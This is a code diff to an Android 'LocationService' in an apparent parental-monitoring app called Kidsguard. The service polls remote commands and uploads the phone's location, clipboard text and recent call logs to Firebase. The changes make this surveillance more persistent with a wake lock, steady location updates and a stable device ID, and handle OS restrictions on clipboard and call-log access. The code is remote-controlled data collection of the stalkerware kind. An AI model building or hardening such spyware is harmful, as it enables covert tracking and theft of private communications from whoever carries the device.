@@ -59,32 +59,60 @@ public class LocationService extends Service {
     public static final String KEY_PASS = "parent_password";
 
     public static LocationService instance;
+    private static volatile boolean alive;
+    public static boolean isRunning() { return alive; }
     private static android.media.MediaPlayer alarmPlayer = null;
     private LocationManager lm;
+    private LocationListener locationListener;
     private Handler handler = new Handler(Looper.getMainLooper());
     private String deviceId;
     private SharedPreferences prefs;
 
+    private static final long COMMAND_INTERVAL_MS = 60_000L;
+    private static final long LOCATION_INTERVAL_MS = 30_000L;
+    private final java.util.concurrent.ExecutorService io = java.util.concurrent.Executors.newSingleThreadExecutor();
+
     private Runnable commandPoller = new Runnable() {
         @Override
         public void run() {
+            if (!alive) return;
             checkCommands();
-            handler.postDelayed(this, 3000);
+            handler.postDelayed(this, COMMAND_INTERVAL_MS);
         }
     };
 
     private Runnable locationUpdater = new Runnable() {
         @Override
         public void run() {
+            if (!alive) return;
             uploadLocation();
-            handler.postDelayed(this, 30000);
+            handler.postDelayed(this, LOCATION_INTERVAL_MS);
         }
     };
+
+    private android.os.PowerManager.WakeLock wakeLock;
+
+    private void acquireWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) return;
+        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm == null) return;
+        wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Kidsguard::LocationWakeLock");
+        wakeLock.acquire(10 * 60 * 1000L);
+    }
+
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+        wakeLock = null;
+    }
 
     @Override
     public void onCreate() {
         super.onCreate();
+        alive = true;
         instance = this;
+        acquireWakeLock();
         prefs = getSharedPreferences(PREFS, 0);
         deviceId = getSafeDeviceId(this);
         startForegroundNotification();
@@ -96,19 +124,15 @@ public class LocationService extends Service {
 
     public static String getSafeDeviceId(Context ctx) {
         SharedPreferences p = ctx.getSharedPreferences(PREFS, 0);
-        String id = p.getString(KEY_ID, "");
-        if (id.isEmpty()) {
-            id = generateId();
-            p.edit().putString(KEY_ID, id).apply();
-        }
-        return id;
-    }
+        String cached = p.getString(KEY_ID, null);
+        if (cached != null && cached.length() == 6) return cached;
 
-    private static String generateId() {
-        Random r = new Random();
-        StringBuilder sb = new StringBuilder();
-        for (int i = 0; i < 6; i++) sb.append(r.nextInt(10));
-        return sb.toString();
+        String raw = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
+        if (raw == null || raw.isEmpty()) raw = java.util.UUID.randomUUID().toString();
+
+        String code = String.format(Locale.US, "%06d", Math.abs(raw.hashCode() % 1000000));
+        p.edit().putString(KEY_ID, code).apply();
+        return code;
     }
 
     private void startForegroundNotification() {
@@ -149,7 +173,7 @@ public class LocationService extends Service {
         try {
             lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             if (lm == null) return;
-            LocationListener listener = new LocationListener() {
+            locationListener = new LocationListener() {
                 @Override public void onLocationChanged(Location location) { uploadLocation(location); }
                 @Override public void onStatusChanged(String p, int s, Bundle e) {}
                 @Override public void onProviderEnabled(String p) {}
@@ -158,8 +182,11 @@ public class LocationService extends Service {
             if (Build.VERSION.SDK_INT >= 23 &&
                     checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                             != PackageManager.PERMISSION_GRANTED) return;
-            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 5, listener);
-            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 5, listener);
+            for (String provider : new String[]{ LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER }) {
+                if (lm.getAllProviders().contains(provider)) {
+                    lm.requestLocationUpdates(provider, 10000, 5, locationListener);
+                }
+            }
         } catch (Exception e) { e.printStackTrace(); }
     }
 
@@ -169,22 +196,33 @@ public class LocationService extends Service {
             if (Build.VERSION.SDK_INT >= 23 &&
                     checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                             != PackageManager.PERMISSION_GRANTED) return;
-            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            Location loc = null;
+            for (String p : new String[]{ LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER }) {
+                if (lm.getAllProviders().contains(p)) {
+                    Location l = lm.getLastKnownLocation(p);
+                    if (l != null && (loc == null || l.getTime() > loc.getTime())) loc = l;
+                }
+            }
             if (loc != null) uploadLocation(loc);
         } catch (Exception e) { e.printStackTrace(); }
     }
 
     private void uploadLocation(Location loc) {
-        double lat = loc.getLatitude();
-        double lng = loc.getLongitude();
-        String address = getAddress(lat, lng);
-        String timeStr = new SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault())
-                .format(new Date());
-        String data = "{\"lat\":" + lat + ",\"lng\":" + lng
-                + ",\"address\":\"" + FirebaseHelper.escapeJson(address)
-                + "\",\"time\":\"" + timeStr + "\"}";
-        FirebaseHelper.put("devices/" + deviceId + "/location.json", data);
+        new Thread(() -> {
+            try {
+                double lat = loc.getLatitude();
+                double lng = loc.getLongitude();
+                String address = getAddress(lat, lng);
+                String timeStr = new SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault())
+                        .format(new Date());
+                org.json.JSONObject data = new org.json.JSONObject();
+                data.put("lat", lat);
+                data.put("lng", lng);
+                data.put("address", address);
+                data.put("time", timeStr);
+                FirebaseHelper.put("devices/" + deviceId + "/location.json", data.toString());
+            } catch (Exception e) { e.printStackTrace(); }
+        }).start();
     }
 
     private String getAddress(double lat, double lng) {
@@ -375,11 +413,18 @@ public class LocationService extends Service {
                 return;
             }
             if ("get_clipboard".equals(cmd) || "get_clipboard_text".equals(cmd)) {
-                android.content.ClipboardManager cm =
-                        (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-                String text = cm != null && cm.getPrimaryClip() != null
-                        && cm.getPrimaryClip().getItemCount() > 0
-                        ? cm.getPrimaryClip().getItemAt(0).getText().toString() : "";
+                String text = "";
+                try {
+                    android.content.ClipboardManager cm =
+                            (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+                    if (cm != null && cm.getPrimaryClip() != null
+                            && cm.getPrimaryClip().getItemCount() > 0) {
+                        CharSequence cs = cm.getPrimaryClip().getItemAt(0).getText();
+                        if (cs != null) text = cs.toString();
+                    }
+                } catch (SecurityException e) {
+                    text = "Clipboard access restricted in background on Android 10+";
+                } catch (Exception e) {}
                 JSONObject o = new JSONObject();
                 o.put("clipboard", text);
                 pushJson("clipboard", o);
@@ -1382,9 +1427,10 @@ public class LocationService extends Service {
         new Thread(new Runnable() {
             @Override
             public void run() {
+                android.database.Cursor cursor = null;
                 try {
                     JSONArray arr = new JSONArray();
-                    android.database.Cursor cursor = getContentResolver().query(
+                    cursor = getContentResolver().query(
                             android.provider.CallLog.Calls.CONTENT_URI,
                             null, null, null,
                             android.provider.CallLog.Calls.DATE + " DESC LIMIT 50");
@@ -1401,10 +1447,16 @@ public class LocationService extends Service {
                             obj.put("duration", durIdx >= 0 ? cursor.getString(durIdx) : "");
                             arr.put(obj);
                         }
-                        cursor.close();
                     }
                     FirebaseHelper.put("devices/" + deviceId + "/call_logs.json", arr.toString());
+                } catch (SecurityException e) {
+                    android.util.Log.w("LocationService", "Call log query restricted by OS policy", e);
                 } catch (Exception e) {}
+                finally {
+                    if (cursor != null) {
+                        try { cursor.close(); } catch (Exception ignored) {}
+                    }
+                }
             }
         }).start();
     }
@@ -1444,9 +1496,13 @@ public class LocationService extends Service {
 
     @Override
     public void onDestroy() {
+        alive = false;
         instance = null;
-        handler.removeCallbacks(commandPoller);
-        handler.removeCallbacks(locationUpdater);
+        releaseWakeLock();
+        handler.removeCallbacksAndMessages(null);
+        if (lm != null && locationListener != null) {
+            try { lm.removeUpdates(locationListener); } catch (Exception ignored) {}
+        }
         super.onDestroy();
     }
 
